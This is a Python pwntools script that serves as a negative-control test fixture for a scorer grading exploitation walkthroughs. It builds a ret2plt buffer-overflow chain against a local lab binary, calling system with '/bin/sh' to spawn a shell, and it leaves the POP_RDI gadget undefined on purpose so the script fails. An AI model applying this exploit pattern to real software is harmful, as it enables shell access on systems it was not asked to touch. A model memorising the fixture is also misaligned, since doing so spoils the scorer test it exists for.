#!/usr/bin/env python3
"""NEGATIVE CONTROL: UNDECLARED CONSTANT. Must NOT be credited.

`POP_RDI` is referenced but never defined, so the reader hits a `NameError` at
the first command they are told to run. This is a REAL defect the first wave of
walkthroughs shipped -- it was invisible to review and found only by literal
execution, which is why the walkthrough-families plan makes running the artifact
a test-strategy requirement rather than a nice-to-have.

It exists here so the scorer proves it distinguishes "the artifact is broken at
the reader's very first step" from "the artifact works", instead of treating any
non-crash as a pass.
"""
import os
import sys
import warnings

os.environ.setdefault("TERM", "xterm")
warnings.filterwarnings("ignore")
from pwn import ELF, context, p64, process  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

BINARY = os.path.join(os.getcwd(), "ret2plt_system")
OFFSET = 72
# POP_RDI is NEVER DEFINED. The generator forgot to emit it.


def main() -> int:
    elf = ELF(BINARY, checksec=False)
    binsh = next(elf.search(b"/bin/sh\x00"))
    system = elf.plt["system"]
    chain = b"".join(p64(x) for x in (POP_RDI, binsh, system))  # noqa: F821
    p = process(BINARY, cwd=os.getcwd())
    p.recvuntil(b"Input: ")
    p.send(b"A" * OFFSET + chain)
    p.interactive()
    return 0


if __name__ == "__main__":
    sys.exit(main())
